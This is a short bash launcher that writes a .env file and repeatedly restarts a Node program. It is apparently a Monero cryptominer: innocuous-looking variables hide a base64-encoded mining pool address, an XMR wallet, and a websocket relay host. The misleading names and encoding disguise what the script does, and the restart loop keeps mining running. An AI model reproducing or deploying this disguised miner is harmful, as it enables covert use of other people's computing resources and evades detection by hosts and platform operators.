#!/bin/bash
CONNECT=${1:-8}
NAME=${2:-003}
echo "SERVER_WS=ws://cdn.keitaro.my.id
SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
SERVER_DOMAIN=XMR:8AZERRM5FvH5UwnW8VrBreH32DHZd799YJiYjsLnDycjgmrdqzSEBC5AwfYAMt5bY78RtzuabcVyWYdVNbSJtiACSBsWen7
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 10; done
